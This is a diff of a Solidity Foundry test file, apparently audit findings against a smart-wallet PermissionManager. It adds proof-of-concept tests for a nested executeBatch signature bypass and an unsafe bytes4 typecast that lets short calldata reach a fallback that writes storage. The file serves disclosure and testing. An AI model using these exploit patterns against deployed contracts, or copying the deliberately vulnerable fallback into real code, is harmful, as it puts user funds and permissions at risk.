@@ -13,7 +13,7 @@ import {MockEntryPoint} from "smart-wallet/../test/mocks/MockEntryPoint.sol";
 import {ECDSA} from "solady/utils/ECDSA.sol";
 import {EntrypointRuntimeBytecode} from "./EntrypointRuntimeBytecode.sol";
 
-contract PermissionManagerBase is Test, EntrypointRuntimeBytecode {
+contract Findings is Test, EntrypointRuntimeBytecode {
     PermissionManager permissionManager;
     uint256 ownerPk = uint256(keccak256("owner"));
     address owner = vm.addr(ownerPk);
@@ -62,6 +62,52 @@ contract PermissionManagerBase is Test, EntrypointRuntimeBytecode {
         // emit PermissionManager.PermissionApproved(address(account), nonstandardPermissionHash);
         // permissionManager.approvePermission(nonstandardPermission);
         // vm.assertEq(permissionManager.isPermissionAuthorized(nonstandardPermission), true);
+    }
+
+    function test_nestedExecuteBatch() public {
+        _etchEntrypoint();
+        _initializePermissionManager();
+
+        PermissionManager.Permission memory permission = _createPermissionWithApproval();
+        UserOperation memory userOp = _createUserOpNestedExecuteBatch(permission);
+
+        // if PermissionManager is owner for two smart accounts who also are owners of each other
+
+        PermissionManager.PermissionedUserOperation memory permissionedUserOp;
+        permissionedUserOp.userOp = userOp;
+        permissionedUserOp.permission = permission; // internal func to return permissionedUserOp w/ these?
+
+        // `entryPoint.getUserOpHash(userOp)`
+        (, bytes memory ret) = entrypoint.call(bytes.concat(hex'a6193531', abi.encode(userOp)));
+        bytes32 userOpHash = bytes32(ret);
+
+        permissionedUserOp.userOpSignature = _getSignature(userOpHash, permmissionSignerPk);
+        permissionedUserOp.userOpCosignature = _getSignature(userOpHash, cosignerPk);
+
+        bytes4 magicValue = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
+        bytes4 canonicalEIP1271Val = bytes4(0x1626ba7e);
+        assertEq(magicValue, canonicalEIP1271Val); // signature is valid on first pass
+    }
+
+    function _createUserOpNestedExecuteBatch(PermissionManager.Permission memory permission) internal returns (UserOperation memory) {
+        UserOperation memory userOp;
+
+        userOp.sender = address(account);
+        userOp.nonce = 4337;
+        address paymaster = address(0x42);
+        userOp.paymasterAndData = abi.encodePacked(paymaster);
+
+        CoinbaseSmartWallet.Call[] memory calls = new CoinbaseSmartWallet.Call[](1);
+        bytes memory beforeCallsData = abi.encodeWithSelector(PermissionManager.beforeCalls.selector, permission, paymaster, cosigner);
+        calls[0] = CoinbaseSmartWallet.Call(address(permissionManager), 0, beforeCallsData);
+
+        userOp.callData = abi.encodeWithSelector(
+            CoinbaseSmartWallet.executeBatch.selector,
+            calls
+        );
+
+        return userOp;
+
     }
 
     function test_malleableCosignatureReplay() public {
@@ -270,7 +316,65 @@ contract PermissionManagerBase is Test, EntrypointRuntimeBytecode {
         vm.etch(entrypoint, ENTRYPOINT_RUNTIME_BYTECODE);
     }
 
+    function test_permissionedCallUnsafeTypecastBytes4() public {
+        InnocentContractInheritsPermissionCallable innocentContract = new InnocentContractInheritsPermissionCallable();
+        innocentContract.permissionedCall(hex'ffffff');
+        assertEq(innocentContract.sensitiveStorage(), hex'ffffff');
+        innocentContract.permissionedCall(hex'ffff');
+        assertEq(innocentContract.sensitiveStorage(), hex'ffff');
+        innocentContract.permissionedCall(hex'ff');
+        assertEq(innocentContract.sensitiveStorage(), hex'ff');
+        innocentContract.permissionedCall('');
+        assertEq(innocentContract.sensitiveStorage(), hex'');
+    }
 }
+
+contract InnocentContractInheritsPermissionCallable is PermissionCallable {
+    bytes public sensitiveStorage; // mutable via fallback
+
+    // this function's selector == 0x00000000
+    function supportedPermissionedCallWithAtLeastOneTrailingZeroByte4273234894() public {
+        // does innocent intentional stuff
+    }
+
+    // this function's selector == 0xff000000
+    function supportedPermissionedCallWithAtLeastOneTrailingZeroByte2569728703() public {
+        // does innocent intentional stuff
+    }
+
+    // this function's selector == 0xffff0000
+    function supportedPermissionedCallWithAtLeastOneTrailingZeroByte4600833262() public {
+        // does innocent intentional stuff
+    }
+
+    // this function's selector == 0xffffff00
+    function supportedPermissionedCallWithAtLeastOneTrailingZeroByte15430792436() public {
+        // does innocent intentional stuff
+    }
+
+    /// @notice Returns true if `selector` is passed with 0x00000000, 0xff000000, 0xffff0000, or 0xffffff00
+    /// These 4-byte values will be passed in by `permissionedCall()` after its unsafe typecast padding 
+    function supportsPermissionedCallSelector(bytes4 selector) public view virtual override returns (bool) {
+        if (
+            selector == this.supportedPermissionedCallWithAtLeastOneTrailingZeroByte4273234894.selector ||
+            selector == this.supportedPermissionedCallWithAtLeastOneTrailingZeroByte2569728703.selector ||
+            selector == this.supportedPermissionedCallWithAtLeastOneTrailingZeroByte4600833262.selector ||
+            selector == this.supportedPermissionedCallWithAtLeastOneTrailingZeroByte15430792436.selector
+        ) {
+            return true;
+        }
+    }
+
+    /// @notice If `this.permissionedCall(bytes calldata call)` is invoked with any of the following:
+    ///   `call == ''` || `call == hex'00'` || `call == hex'ff'` || `call == hex'ffff'` || `call == hex'ffffff'`
+    /// This fallback function will be executed instead of intended behavior which is to revert
+    fallback(bytes calldata uhOh) external returns (bytes memory) {
+        require(msg.sender != address(this), "Sensitive stuff happens here: self-delegatecall only!");
+        sensitiveStorage = uhOh;
+        return sensitiveStorage;
+    }
+}
+
 /**stanndard:
 0000000000000000000000000000000000000000000000000000000000000020 struct ofs
 0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b account
